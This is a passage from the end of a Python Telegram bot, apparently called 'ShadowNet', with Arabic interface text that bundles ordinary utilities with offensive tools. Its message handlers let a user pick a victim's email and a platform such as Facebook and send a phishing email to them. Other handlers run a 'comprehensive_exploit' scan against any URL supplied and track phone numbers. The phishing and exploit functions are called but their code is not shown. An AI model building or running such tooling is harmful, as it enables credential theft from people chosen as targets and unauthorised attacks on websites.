                    safe_send(chat_id, "❌ لم يتم تحديد جهاز")
            except:
                safe_send(chat_id, "❌ أدخل رقم صحيح")
            user_states[chat_id] = None
            return

        # ===== تحميل الفيديو (الجزء المهم) =====
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري تحميل الفيديو... قد يستغرق بعض الوقت.")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    os.remove(filename)
                    safe_send(chat_id, "✅ تم إرسال الفيديو بنجاح!")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الفيديو: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return

        # ===== خدمات عامة =====
        if state == "waiting_weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return
        if state == "waiting_wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_password_strength":
            strength, crack_time, score = password_strength(text)
            safe_send(chat_id, f"🔐 القوة: {strength}\nوقت الاختراق: {crack_time}\nالدرجة: {score}/6")
            user_states[chat_id] = None
            return
        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return
        if state == "waiting_news":
            safe_send(chat_id, f"📰 الأخبار:\n{get_news_without_api(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_shorten_url":
            result = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{result if result else 'فشل'}")
            user_states[chat_id] = None
            return
        if state == "waiting_expand_url":
            result = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{result if result else 'فشل'}")
            user_states[chat_id] = None
            return
        if state == "waiting_phone_number":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return
        if state == "waiting_scan_url":
            safe_send(chat_id, "🔍 جاري الفحص...")
            result = comprehensive_exploit(text)
            safe_send(chat_id, format_exploit_report(result))
            save_scan_result(text, "comprehensive", result)
            user_states[chat_id] = None
            return
        if state == "waiting_translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة:", reply_markup=build_translate_menu())
            return
        if state == "waiting_tts":
            user_states[f"{chat_id}_tts_text"] = text
            safe_send(chat_id, "🎤 اختر الصوت:", reply_markup=build_voice_menu())
            return
        if state == "waiting_link_check_advanced":
            safe_send(chat_id, "🔍 جاري فحص الرابط...")
            result = check_link_safety_advanced(text, chat_id)
            safe_send(chat_id, format_exploit_report(result))
            user_states[chat_id] = None
            return
        if state == "waiting_broadcast":
            if not is_admin(chat_id): return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم")
            user_states[chat_id] = None
            return
        if state == "waiting_send_to_user":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_send_target")
            if target_user:
                safe_send(target_user, text)
                safe_send(chat_id, f"✅ تم الإرسال إلى {get_user_name(target_user)}")
            user_states[chat_id] = None
            return
        if state == "waiting_admin_points_amount":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_points_target")
            if target_user:
                try:
                    amount = int(text)
                    add_points(target_user, amount, "إدارة النقاط")
                    safe_send(chat_id, f"✅ تم إضافة {amount} نقطة")
                except:
                    safe_send(chat_id, "❌ أدخل عدد صحيح")
            user_states[chat_id] = None
            return
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            user_states[chat_id] = "waiting_phishing_action"
            user_states[f"{chat_id}_phishing_target_email"] = text
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("✍️ كتابة يدوية", callback_data="phish_action_manual"), InlineKeyboardButton("🤖 إنشاء تلقائي", callback_data="phish_action_auto"))
            safe_send(chat_id, f"المنصة: {platform}\nالبريد: {text}\nاختر طريقة الإنشاء:", reply_markup=markup)
            return
        if state == "waiting_phishing_custom_message":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                safe_send(chat_id, f"⏳ جاري إرسال البريد المخصص...")
                result = send_phishing_email(target_email, platform, custom_message=text)
                safe_send(chat_id, result)
            else:
                safe_send(chat_id, "❌ حدث خطأ.")
            user_states[chat_id] = None
            return
        if state == "waiting_pdf_question":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📚 الإجابة:\n{smart_pdf_search(pdf_text, text)}")
            else:
                safe_send(chat_id, "❌ لم يتم تحميل ملف PDF.")
            user_states[chat_id] = None
            return
        if state == "waiting_apk_analysis":
            safe_send(chat_id, "📦 أرسل ملف APK.")
            return

        if state is None:
            safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في النص: {e}")

# ===================== معالجات الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم استخراج النص (عدد الأحرف: {len(text)})")
                markup = InlineKeyboardMarkup(row_width=2)
                markup.row(InlineKeyboardButton("تلخيص", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
                markup.row(InlineKeyboardButton("تحليل ذكي", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
                safe_send(chat_id, "اختر الإجراء:", reply_markup=markup)
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "waiting_apk_analysis":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK")
                return
            safe_send(chat_id, "📦 جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ فشل: {result['error']}")
            else:
                msg = f"📦 تحليل APK:\nالملف: {file_name}\nالأذونات الخطيرة: {result.get('dangerous_permissions', [])}\nضار: {'نعم' if result.get('malicious') else 'لا'}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== دوال Keep-Alive والتذكيرات =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except:
            pass

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,), fetch_one=False)
            for rid, chat_id, msg in rows:
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===================== تشغيل البوت =====================
def start_bot():
    while True:
        try:
            try:
                bot.delete_webhook()
                logger.info("✅ Webhook deleted")
                time.sleep(2)
            except Exception as e:
                logger.warning(f"⚠️ Webhook deletion failed: {e}")

            logger.info("🚀 Starting bot polling...")
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            logger.error(f"❌ Bot error: {e}")
            if "409" in str(e):
                logger.warning("⚠️ Conflict 409. Waiting 15 seconds...")
                time.sleep(15)
            else:
                logger.warning(f"⚠️ Unknown error. Retrying in 10 seconds...")
                time.sleep(10)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet + T11 - النسخة النهائية المصححة")
    print(f"📌 Health Check: {SERVER_URL}/health")
    print("="*60 + "\n")

    try:
        bot.delete_webhook()
    except:
        pass

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
